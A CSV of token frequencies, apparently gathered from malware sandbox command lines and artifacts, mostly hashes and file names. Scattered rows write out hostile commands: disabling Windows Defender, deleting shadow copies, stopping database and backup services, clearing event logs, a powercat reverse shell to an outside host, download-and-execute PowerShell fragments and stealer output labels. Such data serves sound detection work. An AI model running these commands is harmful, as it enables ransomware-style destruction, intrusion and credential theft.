Token,Frequency
c echo JzHWSBvTS,1
"d1f3f434811b968d2be2222a9e526b62.exe.dll,DllMain",1
761eba8b546bc3e11a032d9ca66368f3,1
"d55af41c8146d90ccfd88658478db616.exe.dll,DllMain",1
04c40287db4ffd664047ab402c7b3a66,1
44f353d9137940ad50196834dd1df839,1
47087875199d8dcb3e377405fb59a7a0,1
4e9465f354ee56df87d025b934c08640,1
2fd1bc42f16032530fd1fbc1fba7c1e6,1
YourPhone.exe YourPhone.exe ENABLE,1
67117722a9ac9bba49c803d7d7e9bbce,1
06b217f3ddf8de03392db7fbcf1a1259,1
2679dc2c0bfdc9deadb2cae522c99dcc,1
64294507e5bdcbcd750e47aef570b03e,1
powershell.exe -ExecutionPolicy Bypass Add-MpPreference -ExclusionProcess .exe,1
3fced77d0a90d1a395edeb911096a5b1,1
"f4e2f8fbb68df684ba872a4702de3b05.exe.dll,DllMain",1
5aa19ed05c6f153a2450ade1ab2476f8,1
1f871a038381e797e3fff7ca257a7452,1
8f27cc7464a79ef69cdd0a004dca7f24,1
4226b243889b6856a14ebf190d127dfa,1
073c2d61c9c70dd6a7ef88b0784258cc,1
1f6175a7245314a036209f8af4aace42,1
c sc stop windefend,1
c sc delete windefend,1
sc  delete windefend,1
im Wireshark,1
sc  query windefend,1
c sc query windefend,1
021298199c96a5b915f3361e9ddb264d,1
cswqqmdt.pif evkfor.dll,1
wscript.exe Update-tq.g.vbe,1
75a2f5e222103b3876712e68d367bd2d,1
16602c44f08a9cfab5b8cfdfef4e10f3,1
c start cmd,1
c start psr,1
c start charmap,1
c start control,1
c start mspaint,1
c start magnify,1
c start explorer,1
c start notepad,1
387b8bd4488df5fdf84c2b2d389a07c8,1
83625227a5c203963860ec4b5b5983d4,1
8e0cf47e12d408805114e8d548768d60.exe 8e0cf47e12d408805114e8d548768d60.exe ENABLE,1
stories.exe stories.exe ENABLE,1
837ccebbd703e249364ee6ab0fd70d46,1
8ad3e5891d7039bfc5aab96863f967af,1
Xworm V5.6.exe,1
9c6d3214a3ae273354bf9b5f4b1b1564,1
fjhtaptrqj.pif ljju.maj,1
im firefox,1
._cache_oh.exe,1
im microsoftedge,1
im mspaint,1
shutdown  -r -t 60,1
im chrome,1
msg  * Please Subscribe zenhao lau!!,1
im msedge,1
im iexplore,1
msg  * Enjoy!!,1
msg  * Youve Been Hacked By zenhao lau Youtuber!!!,1
im opera,1
"83b3cbe5fb9bc31a4da5c4f5a0f83306.exe.dll,DllMain",1
V Organic Third,1
k move Librarian.vstx Librarian.vstx.cmd & Librarian.vstx.cmd & exit,1
Y Plastics.vstx *.*,1
"a826402b659d4ba5a3ede479a7eb79f8.exe.dll,DllMain",1
server1.exe server1.exe ENABLE,1
19aee8388892add3f80b9ea9ded79453,1
9d63309aa72a4086e0e88ba6511c3c44,1
Chrome Update Services,1
E Campaigns,1
V HANDHELD Know,1
c md 610839,1
c copy Exclude.vss Exclude.vss.bat & Exclude.vss.bat,1
61b24ec6f5e01b5ac6f91da0170a0b41,1
7b59e531a14b21feb00a166efffb2788,1
3c220aad5ba5a64e764f4719ad7176e7,1
ping  1.1.1.1 -n 5 -w 5000,1
ATLauncher-setup-1.3.0.0.exe,1
94105fdec1373bba88c3b1a85e615cf0,1
5dc382db2d642773271633d190c6e088,1
5382886220148b6e343fdb442f063929,1
7055bf30202f5d9c4e415fa659f4c951,1
9a5df73e3193f14444962d0560abeab0,1
46ae1a829f57e4781ce4ff31f8a04395,1
23c3518c9927981a15e28aa822bd5de5,1
518128baed684c4f8753c24d4f4009d7,1
$nya-Loli,1
4017ebaa5d610e38e70b6bdaaf0c5eb4,1
29f1f13d40ccf2adc5883ce8828618ec,1
"Rengjorde.Dec;$niddingernes=$Magh.SubString(58023,3);.$niddingernes($Magh)",1
"3b97b2772321462de0f09f9b5e69bdee.exe.dll,DllMain",1
0ab5edf74fe02ef604704ac6e5b833a2,1
5f49e72369ca1ede7dc5fcf79b6e8d96,1
901eef219fa71dea57cabb6774068a8e,1
0f1be226bf62d10798daa9875a86033b,1
c test,1
5553c831f5b38f01a076c8cb1d81672c,1
897d2d647d51608f74a7316a587d70a2,1
"OYTfqa,i);}catch(e){}},10);",1
VPLOB));close();,1
c wmic SHADOWCOPY DELETE,1
wmic  SHADOWCOPY DELETE,1
advapi32.dll.RegQueryValueA,1
advapi32.dll.RegSetValueA,1
user32.dll.SendDlgItemMessageA,1
64ded849b913f5b386a49d57798cbc66,1
"b8db542468854a131e70415e2adbfa7d.exe.dll,DllMain",1
36qpt,1
7967039c7a1d62911dd758b27ac43dfe,1
5a93fe57eaaa4fd0ce5fc4d2eea1e98b,1
181a79ff1ba7b867c204ab0767071ed1,1
powershell Get-Date,1
"c13da96d128aa9e2a6cc698de3f5c07c.exe.dll,DllMain",1
15da6cbbc2fdf34cf7daed46e391bc0c,1
3f9052ca9d46369d7c6d5ba1995a4f36,1
Link-Invite,1
Discord-Invite,1
717b1a8b00ff9d599882adbcf9033098,1
im 717b1a8b00ff9d599882adbcf9033098,1
990b2e6019c0adf9ca1b32e1534b9f1a,1
3bf21052f50823184528c0ac7084a4c9,1
99fc9eb0cfe2920b5d11f5bea2de4824.exe.dll,1
1913069562edd7f59b07392674d87bfb,1
c WMIC SERVICE WHERE caption LIKE %SBS% CALL STOPSERVICE,1
WMIC  SERVICE WHERE caption LIKE %MSSQL% CALL STOPSERVICE,1
WMIC  SERVICE WHERE caption LIKE %Exchange% CALL ChangeStartMode Disabled,1
WMIC  SERVICE WHERE caption LIKE %Firebird% CALL STOPSERVICE,1
c WMIC SERVICE WHERE caption LIKE %SQL% CALL STOPSERVIC,1
WMIC  SERVICE WHERE caption LIKE %SQL% CALL ChangeStartMode Disabled,1
c WMIC SERVICE WHERE caption LIKE %wsbex% CALL STOPSERVICE,1
c WMIC SERVICE WHERE caption LIKE %Firebird% CALL STOPSERVICE,1
c WMIC SERVICE WHERE caption LIKE %Firebird% CALL ChangeStartMode Disabled,1
c WMIC SERVICE WHERE caption LIKE %Exchange% CALL STOPSERVICE,1
WMIC  SERVICE WHERE caption LIKE %postgresql% CALL STOPSERVICE,1
WMIC  SERVICE WHERE caption LIKE %Firebird% CALL ChangeStartMode Disabled,1
wevtutil  cl Application,1
c WMIC SERVICE WHERE caption LIKE %MSSQL% CALL ChangeStartMode Disabled,1
WMIC  SERVICE WHERE caption LIKE %SQL% CALL STOPSERVIC,1
c WMIC SERVICE WHERE caption LIKE %postgresql% CALL STOPSERVICE,1
WMIC  SERVICE WHERE caption LIKE %wsbex% CALL STOPSERVICE,1
wevtutil  cl setup,1
c WMIC SERVICE WHERE caption LIKE %MSSQL% CALL STOPSERVICE,1
c WMIC SERVICE WHERE caption LIKE %Exchange% CALL ChangeStartMode Disabled,1
c WMIC SERVICE WHERE caption LIKE %SQL% CALL ChangeStartMode Disabled,1
c WMIC SERVICE WHERE caption LIKE %SharePoint% CALL STOPSERVICE,1
WMIC  SERVICE WHERE caption LIKE %BACKP% CALL STOPSERVICE,1
c WMIC SERVICE WHERE caption LIKE %tomcat% CALL STOPSERVICE,1
c wevtutil cl Application,1
WMIC  SERVICE WHERE caption LIKE %tomcat% CALL STOPSERVICE,1
WMIC  SERVICE WHERE caption LIKE %SBS% CALL STOPSERVICE,1
c wevtutil cl setup,1
WMIC  SERVICE WHERE caption LIKE %Exchange% CALL STOPSERVICE,1
c WMIC SERVICE WHERE caption LIKE %BACKP% CALL STOPSERVICE,1
WMIC  SERVICE WHERE caption LIKE %SharePoint% CALL STOPSERVICE,1
WMIC  SERVICE WHERE caption LIKE %MSSQL% CALL ChangeStartMode Disabled,1
198ab5addfe3e76a2e611daac5f9f5df,1
71d59f706602139b0a336a8f040cf29d,1
System.Net.Sockets.Socket::SendAsync,1
System.Net.Sockets.Socket::ReceiveAsync,1
1171e0122519191f85e43e94f323ae2e,1
powershell?mode=QUZKRgAB | iex,1
593ed2c378943d9725913f4515592c46,1
324da0bdc1f94a7bcf17d36a58db39c7,1
9d44e535ca5d6b0b61333dbbe853dc61,1
580f8e7d91f01259845a4bc1a40cdd0d,1
8168c25a5652249072ac81cc0aa79ad5,1
4ohhJW1a6P98lT48rocpEF,1
49e9b24418ab9fd5c579f0ec0634d65d,1
09666ab60c5d49f19710ff830d10b1a8,1
979a208f3f5b9d9e8f909776d3606f41,1
mpr.dll.WNetAddConnection2A,1
mpr.dll.WNetCancelConnection2A,1
5p6LduTHJQMifGwCpuxwxJH4aAFukp2fakQisIYTUIl,1
9FSz0xBCrS4LMc7SY8Hh9U0KNxzWBRw5K92v2YX1QWzzccbErx,1
6cb73da117894124b74b79192cdd17bd,1
"acd5d948dd4e9427b64dce33e58b3f6d.15864.dll,DllMain",1
8b199c369022c4c6999682cec5f60bde,1
6c9919010ced1717b3d79391f7e6e142,1
Y Taxes.pptx *.*,1
c copy Answer.pptx Answer.pptx.cmd & Answer.pptx.cmd,1
V exit Nr,1
3f048a671000091bad452d39c84aaa7a,1
7e4450f23bc117099bead58d6e4491d3,1
4a8d0b4c6604c89121191eca311561c0,1
7eaf30955706186c77d98d59cfa6d0d1,1
7e31eccec82833aad3adb4b95ca1d6a7,1
Java.exe Java.exe ENABLE,1
123.sfx.exe  -psfghfghsgfshgfhsgsfghhg23gre,1
47df9feb9be2a4c91e4fc5832397827d,1
9d08e0b58e398d1eba2c0478e02d4414,1
9a470de4fa85b8497cd019d088380a6e,1
1da4786b2b227bf36ced962911fa2cc7,1
338eb263c1969ff853e534e0bff1ef91,1
2024x100,1
7za.exe x -y -p3198034431885414182 Everything64.dll,1
1e0fc3b4e5e86a383eafff44ab4713ec,1
7154c3e1a1b9e0d7380b3e6a4b443379,1
mbr x32,1
mbr x64,1
4a224113961166d8f275e2457a1d356a,1
171f538a9fcbc80c1ae749967611a3ba,1
21daf27cc45b33c8553a099d40766e2e,1
3966d322460164374efa34649070c94e,1
607981392719ea13d1da5c46c95ed4dc,1
70713bbf56065e6a7f04f31aa9bc7198,1
6806de9c39de9f4ad17c28f2e57b0829,1
6b80b2d1e3d6ae9f1070c59a7afae837,1
271fcb84f48380ac33bc75246365a668,1
f2jwtyru.wxe.exe,1
665fec7f4f732b24cf9cbece2cfddaba,1
14fef3f648476b4c30c029201b05b83a,1
min fiQ62iH1,1
9a92c7afae45828341bebba2a5984a2c,1
6ccd2e44a75cc5da13819ff46f9f26c1,1
78580c5f3d13afef3d25d0ba8925265e,1
08d7a77fcb1c48a63e3ef87882ed8dcb,1
"timeout  4,452",1
"c timeout 4,452",1
System.IO.Compression.ZipFile::ExtractToDirectory,1
04aa0a486d9ed8cd50e74108282d8f77,1
4fe924d15dc39da844f95f8cb6f4e045,1
44657a6709519c65e03f67d54187ce4e,1
3c841e215448c8d81723f03ca160a149,1
5572041acf1fe7909543ff3e92b44eaf,1
4224572ca171a1898c30e8e62ca444a1,1
6a047118fa1f7821b591bcc3c0ff2aed,1
"e2767511e16cbb44383667bedebd7a0b.exe.dll,DllMain",1
472c9e4604a74f65bf04ef91b68cf539,1
rundll32  qsfa3,1
375519961O57540,1
000ad3942695703a1f4a9013aa06ea2c,1
72e39b02ac3fc170e814d099f82dd965,1
8634083eab19e4132292252da468d035,1
9c819883aacb17082f784671f0d79bac,1
468a0aa9dd6a461610842aa850945ed1,1
3cc40c9dee0e1480f6ca8cc87b567861,1
209092a34d62d0512cb34b8dec29c742,1
2325f509f883da59c8023a2ba697744f,1
9155634b7487dfdc009cc445bdd63081,1
1643c601c65baf41c55146531dae99f9,1
2motherproject,1
c 3hime,1
7d2c0ff30e7ae9572640fbe2cf0a0421,1
2bc30c089aca7a1f47f3e4950d525f38,1
go-organizer,1
im daumcleaner,1
804e0cda5af4fb182168d1353dd62cd9,1
67415c8a17e06a2622e76fe88471e2f7,1
4613db93cdbbbc166a6074dc0f4b24e2,1
810c76166d0be8e113a2fa78869fcc5a,1
238aee2984d48bc7a40f657984dcc62c,1
6294f7e96388ea38ba8d50db0d31d995,1
730b6f5514cfbc79553a8b99317798b3,1
7b1c95c8c1409f790036b477b7c98f58mgr,1
ashhm8.exe ashhm8.exe,1
arp -a,1
9hgok8,1
0sm11u,1
0iubme,1
8f3122c21cdc45ce33c72ad53768c767,1
14dd6171393a905d6e42e86b817c8327,1
Ole DB,1
Microsoft Shared,1
8e77fc83e52883c0684cea22e59507b5,1
BE7E.tmp.bat,1
0739decf706db7051d3c8f67d3ebe119.exe 0739decf706db7051d3c8f67d3ebe119.exe ENABLE,1
MooReports.exe MooReports.exe ENABLE,1
02805607f389c3f98e71b04730390a01,1
zoom.exe.exe,1
"1abdf23dc7d771afd41d035776c6967b.exe.dll,DllMain",1
d1da7ce9-4446-4092-852d-0250636848ce,1
102fa3d832975f9311b815ad37dd63cc,1
25224cbac8df18ef0af70a3d49830398,1
6k0gx0JWkv8,1
989dbe38e5be5c95b37a28ae33e98f5a,1
41587eee4e18f413a205456fd056e475,1
Windows_Patch_Distribution_Cert-98d8963c,1
88ee0bc44531432908c10395130bf129,1
7467d0f1083210237226b3e4005be9c7,1
2ae8200eba6a0a1820331ad9864d7d39,1
0e148fd6cdf422d4c587251e0a230f8f,1
0X4GCfEQM6h736G5YyDt7ecp,1
1ae903f433a8bf653ab305caedb5d576,1
198b7d814fed473d5427a426fdc7652c,1
xgu4fuzl.eyu.exe,1
5ddfb3c49d196017ae9328acf8544287.exe 5ddfb3c49d196017ae9328acf8544287.exe ENABLE,1
45f98e5d0c06d76208c47fc43f55bfc1,1
55be8c0952c40b23718f21305836465a,1
NSX FREE,1
6718698647f9d241d25cbaa2bec9b2fd,1
0992f2b88824780ac6d4dfd0045a6e23,1
"6a83989d74fc9101c783dfca2b451778.exe.dll,DllMain",1
ajune.exe.exe,1
8c5bebd62ba1922edde11d9b3c147355,1
brbr.bat brbr.bat ENABLE,1
c md 580164,1
E Transfers,1
V Hu Nintendo,1
c copy Authentic.aiff Authentic.aiff.bat & Authentic.aiff.bat,1
5c273c8e459d82a397329513dcd548a4,1
478024bb16ca568400dadd72d6ac99c1,1
838f070526ab6ec9fcb3c039ea48f0d8,1
748fe42a6fb6a9de6dea3e312eb9a183,1
357a76523f9de2d04bf9aa1df04d1a28,1
3e5999023ffb409df9f7dbbb2b7f55f4,1
95fa73eadc2999669ce99a35c425b586,1
2af024b8dafa2806e8de8244f9732d23,1
aa128519db5afe79faeedf08fe9f29a9.vir.dll,1
86202635ee1282e7032de374fc6ee6e2,1
31afda1d6991296782643390d190fa58,1
0c60a4c243014b3758492e7f827fa1fa,1
8e54f3d1ada87266bcd027609a4349ee.exe 8e54f3d1ada87266bcd027609a4349ee.exe ENABLE,1
fb28717a97ee80c3eac336b7c1b7fa51.exe fb28717a97ee80c3eac336b7c1b7fa51.exe ENABLE,1
5b0bcef11513f350e88665d95d8a6cab,1
4c58fd9f359235614f799e74f845322f,1
297ee08c06569ebf11819c6321451205,1
10df33c61841f1a9ae60a31fc994a615,1
07ba04495e94af660b75d0f88937ab28,1
16efa1d5162d093fec91161c0289c989,1
3e74c3c723a7b044ba6331ae12eba6a7,1
power.ps1); powercat -c fbi.fund -p 443 -e cmd,1
5a8f7616dde3c0d5542fedf80404d43b,1
1f2e18cfa008070e78d9abda21b6678c,1
26c382dff851ab469c31bd8b9889bb3d,1
1cfba3811e69583e07ad8633411aec2b,1
6ae3644184b958cfae2f9080d1dbb890,1
367645550d0494048bcff28a6e137849,1
6f52a7ed5bb184a8da8577a98236266e,1
1d2d15159177b328d78a77d0747bb9ec,1
1sb5w4pm,1
Anti-Malware Servicei,1
7b34da7c838d4c05b6a88b1310812e13,1
Geforce Experience,1
Geforce Experience.exe Geforce Experience.exe ENABLE,1
9613b4dd680976f01fab39cd6a046a21,1
97d55bcc018ee964bd3e2cfb3a4feade,1
_Java_java_lang_Object_registerNatives@8,1
_Java_java_lang_System_registerNatives@8,1
_Java_java_lang_System_identityHashCode@12,1
_Java_java_lang_Thread_registerNatives@8,1
_Java_java_security_AccessController_getStackAccessControlContext@8,1
_Java_java_security_AccessController_getInheritedAccessControlContext@8,1
_Java_java_lang_ClassLoader_registerNatives@8,1
_Java_java_lang_Class_registerNatives@8,1
_Java_java_lang_Throwable_fillInStackTrace@12,1
_Java_java_lang_Runtime_freeMemory@8,1
_Java_java_lang_Class_getPrimitiveClass@12,1
_Java_java_lang_Float_floatToRawIntBits@12,1
_Java_java_lang_Double_doubleToRawLongBits@16,1
_Java_sun_misc_VM_initialize@8,1
_Java_sun_reflect_Reflection_getCallerClass@12,1
_Java_java_lang_String_intern@8,1
_Java_java_lang_System_initProperties@12,1
_Java_java_lang_Runtime_maxMemory@8,1
_Java_java_io_FileInputStream_initIDs@8,1
_Java_java_io_FileDescriptor_initIDs@8,1
_Java_java_io_FileDescriptor_set@12,1
_Java_java_io_FileOutputStream_initIDs@8,1
_Java_java_lang_System_setIn0@12,1
_Java_java_lang_Object_getClass@8,1
_Java_java_lang_Class_forName0@20,1
_Java_sun_reflect_Reflection_getClassAccessFlags@12,1
_Java_sun_reflect_NativeConstructorAccessorImpl_newInstance0@16,1
_Java_java_lang_System_setOut0@12,1
_Java_java_lang_System_setErr0@12,1
_Java_java_io_FileSystem_getFileSystem@8,1
_Java_java_io_Win32FileSystem_initIDs@8,1
_Java_java_io_WinNTFileSystem_initIDs@8,1
_Java_java_lang_System_mapLibraryName@12,1
_Java_java_io_WinNTFileSystem_getBooleanAttributes@12,1
_Java_java_io_WinNTFileSystem_canonicalize0@12,1
_Java_java_lang_ClassLoader_00024NativeLibrary_load@12,1
_Java_sun_misc_Signal_findSignal@12,1
_Java_sun_misc_Signal_handle0@20,1
_Java_sun_io_Win32ErrorMode_setErrorMode@16,1
_Java_java_lang_Compiler_registerNatives@8,1
_Java_java_lang_ClassLoader_getCaller@12,1
_Java_java_util_concurrent_atomic_AtomicLong_VMSupportsCS8@8,1
_Java_java_lang_ClassLoader_00024NativeLibrary_find@12,1
_Java_java_io_FileInputStream_open@12,1
_Java_java_io_FileInputStream_readBytes@20,1
_Java_java_io_FileInputStream_available@8,1
_Java_java_lang_reflect_Array_newArray@16,1
_Java_java_lang_Runtime_availableProcessors@8,1
_Java_java_io_FileInputStream_close0@8,1
_Java_java_io_WinNTFileSystem_list@12,1
_Java_java_io_WinNTFileSystem_canonicalizeWithPrefix0@16,1
_Java_java_util_zip_ZipFile_initIDs@8,1
_Java_java_io_WinNTFileSystem_getLastModifiedTime@12,1
_Java_java_util_zip_ZipFile_open@28,1
_Java_java_util_zip_ZipFile_getTotal@16,1
_Java_java_util_zip_ZipFile_getEntry@24,1
_Java_java_util_zip_ZipFile_getEntryFlag@16,1
_Java_java_util_zip_ZipFile_getEntryTime@16,1
_Java_java_util_zip_ZipFile_getEntryCrc@16,1
_Java_java_util_zip_ZipFile_getEntrySize@16,1
_Java_java_util_zip_ZipFile_getEntryCSize@16,1
_Java_java_util_zip_ZipFile_getEntryMethod@16,1
_Java_java_util_zip_ZipFile_getEntryBytes@20,1
_Java_java_util_zip_ZipFile_freeEntry@24,1
_Java_java_util_zip_Inflater_initIDs@8,1
_Java_java_util_zip_Inflater_init@12,1
_Java_java_util_zip_Inflater_inflateBytes@28,1
_Java_java_util_zip_ZipFile_read@44,1
_Java_java_util_zip_Inflater_reset@16,1
_Java_java_util_zip_Inflater_end@16,1
_Java_java_util_zip_ZipFile_close@16,1
_Java_java_lang_ClassLoader_findLoadedClass0@12,1
_Java_java_lang_ClassLoader_findBootstrapClass@12,1
_Java_java_lang_Package_getSystemPackage0@12,1
_Java_java_util_jar_JarFile_getMetaInfEntryNames@8,1
_Java_java_lang_ClassLoader_defineClass1@32,1
553e93d99cfc957dd717a04e31ffc804,1
8d61e1fe1ddf664a162fece746a1202b,1
41f4352238b7b312f909276e85bedd32,1
32f572ef815c5c690c3c20df537b5690,1
7c3a11a1068911cfe336ddc0617a8dc3,1
3801df20c2630f5b9a497374af47bc1a,1
420b9a5bcc01cc2b4ca27485911ba945,1
Bootstrapper_v2.23.exe,1
9dc80abc88686771b218ca7761de1ace,1
352eb3adfa70c6401d84f8625428fa98,1
Troianos RAT,1
1hmaM,1
52da384a725b41343b01d668e69d341d,1
version:1.13.3,1
98ad44a2cd2c2f0f48071b0d05555f0c,1
Start.exe open_agent:sandman.exe,1
6ba0b8f7e5e50a1633d84b79af4ca36f,1
update(s),1
"c8be589cfc8f77054f23f526fbeaa998.exe.dll,DllMain",1
~7302882,1
b96a37e8a0e5bc371c6aedc6dca41f9b.exe.dll,1
517d75201b13a9b6b5236128257d6721,1
jun..exe,1
6867eb0fad54ad1194b18fce7948d807,1
1709512cf4aff049487090792f6555f4,1
DNWAKD~1,1
046ad2ccdee45e9601021db54003c6a1,1
2c5f72a35772716404f7f7e973f3f54e,1
620fd6b58a11e77dbc80bbd8cbe79ee8,1
Updating.exe Updating.exe ENABLE,1
k move Airplane.sldx Airplane.sldx.cmd & Airplane.sldx.cmd & exit,1
Y Diabetes.sldx *.*,1
V bd Implement,1
66dc3abe567940ccfcf46484cf6c75a3,1
._cache_d7c9e4eabb497e8296d520098895c225.exe,1
80d9e229b309cb9426487f68d2aabcfc,1
ping  8.8.8.8 -n 3,1
2e04399479c64e69b653970dd3e895b5,1
smes.exe smes.exe ENABLE,1
9ddc16930bfebaf323ecbf8f02fc89bb,1
28095e1d308935c258b2d66887292e14,1
40896b2a35b776d304c1182b93555cd4,1
PID 1720,1
PID 3040,1
659fcfaefb7afd8f09501fb96f7dfa00,1
41d44fc423be9eacb66be659bd9716ba,1
im lsass,1
9e36d6df62d8bdbc765ac1185224baea,1
1ddbc0928aa69e4d2b0980774ba304f5,1
1d9df7f7301b7c3f9cfd0e922791e779,1
c vol C:,1
41fccfe44a36a71fd237fce14b68a232,1
sid=770,1
5c56b29eb0062d7c77b9e74f57ffbf99,1
2e0677e5c23faba1a71bd46f10da6cac,1
0e184f56eee8a146072a3e771e246eed,1
spoolsv.exe spoolsv.exe ENABLE,1
0f0ac39a208b5889bb6b8ab1da7b59f1,1
2ce9fc392a005639d8ff60052b151875,1
cmss.exe cmss.exe ENABLE,1
shaggugwvk.pif jmapn.msc,1
wscript.exe Update-db.q.vbe,1
0a1a3f93ec9c880d0da616586dbdc19a,1
5ff9a8ab9cdfa46013acce7800515b2a,1
25901a888ee946d7c3a8d7ed4d59c117,1
xdwd enable=yes & exit,1
e31d31d5033769a84342dade61e7d3fc.exe e31d31d5033769a84342dade61e7d3fc.exe ENABLE,1
5627cbb6cd13c6190358aeec48c94bd7,1
3bf0bb58bda5e332cd27679a79e0e80d,1
test.txt.exe,1
37d52df32265f9b6f18d3a32493f5156,1
3lPtXgH9N1E9jEm,1
powershell?mode=RU5FSgo%3D | iex,1
5f99890132f67a1b411174631273b85a,1
8f4a17f97df79fe6e725ad679422702b,1
53720f9f9755d206f8ffc42c6bb10cc0,1
c @echo off,1
c chcp 437,1
chcp  437,1
8MgiEWoxbbYDSMA1DFyZ,1
292a9fbf152b2a2ec1798bf07cb74aff,1
8b3a1af003575d6e7eb28dc90aa31fa7,1
7a04ed50c232cc4850590636f6203d50,1
2ec922e2bc9849f5c7b69c8cbd385cc7,1
Dllhogst.exe Dllhogst.exe ENABLE,1
9cc44d87308c775934b568fadcfca84d,1
89b7c88aeafc6f512d33425660d38b70,1
9399428b60d033f7f4e9e000ff599de6,1
882737dd420db982a37e1ebb1553d72c,1
284740a5f30de8bcb9b023456ce4550b,1
33d63797-b9c4-4fef-9bda-e66e144c22a9,1
7fd873cfe65950831cc82daa7cd486e0,1
3436c199446fe19c8ed3e798f6ef7871,1
517a56053f4b778722d9cb2106b5a929,1
4Vp3r4P,1
14949cf5ff1562442643bcdf893b7560,1
9a7af4d3c07f805091f5313ef088f610,1
7ecdb3629b461cdaff8684148a0f7f4d,1
4693a0ed8db2a9ab69c7fbb39b3903a7,1
064347128c56f02d74877bc0c824846c,1
Exten v2.0 priv.exe,1
"95dd6a11fcba7eaabf9db1bc9d08d54d.exe.dll,DllMain",1
tmp77FC.tmp.bat,1
0f4d92cfaa254fe30ac6de58edf855c1,1
92ee644fb0d0d28ca0fa06f8a0012b17,1
"70add00d5c8095853cc6bdff02a6f5c7.exe.dll,DllMain",1
33b2f52e984de8d8f6c1b2080910d612,1
63cd051117f5d7cbc6b51e1d2ac722fb.sample.dll,1
EAGLERCRAFT_1.12_OFFLINE_EN_US.HTML,1
15c351a95c16a3bed0ca53f339347344,1
36d8ea5161fdcebb2ce58038bef6f3a7,1
8d26fdb6b590dda19edc5f5a5f357b6c,1
powershell.exe -Command Stop-Process -Name cmd.exe -Force,1
S409-M1,1
powershell.exe -Command Stop-Process -Name regedit.exe -Force,1
MONOXIDEX86.HARMLESS.EXE,1
powershell.exe -Command Stop-Process -Name processhacker.exe -Force,1
S409-A1,1
S409-L1,1
powershell.exe -Command Stop-Process -Name taskmgr.exe -Force,1
C:Usersa.monaldoAppDataRoamingMicrosoftWindowswinhide.bat,1
"RUNDLL32.EXE  USER32.DLL,SwapMouseButton",1
powershell.exe -Command Stop-Process -Name procexp.exe -Force,1
S409-L2,1
S409-L3,1
S409 (RUN AS ADMIN),1
deletevalue {current} safeboot,1
S409-L4,1
3c982465eef741d4f0a8abf647618acf,1
9eae0a152af46704922ae3cc5c30f9f5,1
9c9c2b504baae7a50f978d051d3cc907,1
Jalamin game,1
816311c35528612850281529b30cdf3d,1
16c82371ab77c29b822e1946d8318864,1
099e95c9e46d3b688b1effa6577d2a24,1
54bc3d61fc91ab7b9525368b504a6732,1
1004b0eceb258095eec5d13fd418db43,1
8a05d4519beb62043a66b80554ff166d,1
04203ec04ba6628ac5267f2affc93561,1
UID=91,1
1c457578b208376a5dfb755aafba0f98,1
95dacc5f6fa45165bd9817d0670e6075,1
BrowserHistory-output_20250810121619,1
ExtensionsView-output_20250810121619,1
InstalledApps-output_20250810121619,1
FirefoxCookies-output_20250810121619,1
ChromeV20-output_20250810121618,1
WorkingTasks-output_20250810121619,1
DefenderLogs-output_20250810121619,1
AlternativeEdgeCookies-output_20250810121619,1
Autofill-output_20250810121619,1
ProductKeys-output_20250810121619,1
Bookmarks-output_20250810121619,1
AllPasswords-output_20250810121619,1
watch-output_20250810121619,1
4828c4b80a5fd21c80fdb33f3db80baf,1
087dde82b0df63e305f2c908c67bd3cf,1
4b1571a0b106bb05fd7acd6f86f2319a,1
1e8a9a335365f8abe59cd7d98f015949,1
quotes-about-randomness,1
Stick-Figure-RANDOMNESS-1-CRAZY-MAN-306369051,1
2rqdtt,1
sendMessage?chat_id=7654016235&text=FileStarted! -Method Post},1
powershell  -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command -,1
4afe1186c0361e2a5cd4e544ec2a0984,1
35acd89c921f52ceb56ad910c72f8623,1
search?q=how+to+get+money,1
search?q=minecraft+hax+download+no+virus,1
search?q=stanky+danky+maymays,1
search?q=how+to+remove+memz+trojan+virus,1
288c47bbc1871b439df19ff4df68f076,1
net1 pause KWC1152,1
2cd178d6bf7337417f4bba31a1bbdae8,1
89921773c11a345f0946d5e4aecd0dd3,1
"85b1f63f4ed7610bedcc38f49fd2396b.exe.dll,DllMain",1
137a19912033509a215034eb1b0df71a,1
3300583f3b8146428bcc85b2a3413eca,1
e5fd41903d0c92628453faba71fc0d66.exe e5fd41903d0c92628453faba71fc0d66.exe ENABLE,1
810d0ec54b12647769f7e42fd61d1fd2,1
7ac2920c06f7d65e7c6f7e170ec83303,1
072d8fc54c2b22953697bf7b128204e3,1
chrome.exe.exe,1
03d1e19d3ba64b25f176f8ad4fc8eebd,1
7dfaaf5b008373c77de68ba29962d6fc,1
9ba11ed52645e168c9928d0fa95b517e,1
454cokay,1
7f605d0e6c1001fbff09366137d2adda,1
575d19bd9fefe95fb63d1e321b84b9a5,1
c Pause,1
